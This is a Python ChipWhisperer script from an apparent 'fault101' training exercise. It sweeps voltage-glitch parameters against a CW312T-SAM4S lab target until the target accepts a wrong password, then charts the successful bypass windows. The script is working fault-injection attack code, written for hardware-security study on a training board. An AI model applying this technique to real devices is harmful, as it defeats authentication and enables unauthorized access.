#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# fault101 Fault 2_2 - fine-grained sweep near the glitch edge to re-locate the password-bypass window.
import time
from collections import Counter
import numpy as np
import matplotlib; matplotlib.use("Agg")
import matplotlib.pyplot as plt
import chipwhisperer as cw

import sys, os as _os; OUT="/home/dreg/chipwhisperer/dregdoc/img"+(("/"+sys.argv[1]) if len(sys.argv)>1 else ""); _os.makedirs(OUT, exist_ok=True)
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup(); scope.vglitch_setup('hp', default_setup=False)
scope.glitch.trigger_src="ext_single"; scope.adc.timeout=0.1

def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()
WRONG=bytearray([0]*5)
def attempt(w,o,e):
    scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    if scope.adc.state: reboot_flush()
    scope.arm(); target.simpleserial_write('p', WRONG); ret=scope.capture(); scope.io.vglitch_reset()
    if ret: reboot_flush(); return "reset"
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not v['valid'] or v['payload'] is None: reboot_flush(); return "reset"
    return "success" if v['payload'][0]==1 else "normal"

WIDTHS=[1900,1960,2020,2080,2140,2200]
OFFS=list(range(2380,2501,10))     # 13
EXTS=list(range(122,141))           # 19
REPS=2
cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()
cnt=Counter(); successes=[]; recs=[]; attempts=0
for _ in range(REPS):
    for w in WIDTHS:
        for o in OFFS:
            for e in EXTS:
                c=attempt(w,o,e); cnt[c]+=1; attempts+=1; recs.append((w,o,e,c))
                if c=="success":
                    successes.append((w,o,e))
                    if len(successes)==1: print(f"bypass at width={w} offset={o} ext_offset={e} (attempt {attempts})")
cw.set_all_log_levels(cw.logging.WARNING)
scope.dis(); target.dis()
print("OUTCOME:", dict(cnt), f"  attempts={attempts}")
print(f"SUCCESSES: {len(successes)}  rate={100*len(successes)/attempts:.2f}%")
if successes:
    from collections import Counter as C
    print("  by width:", dict(C(s[0] for s in successes)))
    print("  examples:", successes[:12])
    # heatmap over (offset, ext) pooling widths and reps: success count per cell
    grid=np.zeros((len(OFFS), len(EXTS)))
    for (w,o,e,c) in recs:
        if c=="success": grid[OFFS.index(o), EXTS.index(e)]+=1
    plt.figure(figsize=(11,5.5))
    im=plt.imshow(grid, aspect='auto', origin='lower', cmap='inferno',
                  extent=[EXTS[0]-0.5,EXTS[-1]+0.5,OFFS[0]-5,OFFS[-1]+5])
    plt.colorbar(im, label="password bypasses (pooled over widths/reps)")
    plt.xlabel("ext_offset (cycles)"); plt.ylabel("glitch offset (phase-shift steps)")
    plt.title(f"fault101 Fault 2_2: voltage-glitch password bypass, {len(successes)}/{attempts} wrong-pw accepts\n(CW312T-SAM4S via Abductor + Husky Plus)")
    plt.tight_layout(); plt.savefig(f"{OUT}/fault_2_2_vglitch_bypass.png", dpi=115); plt.close()
    print("saved:", OUT+"/fault_2_2_vglitch_bypass.png")
print("DONE")
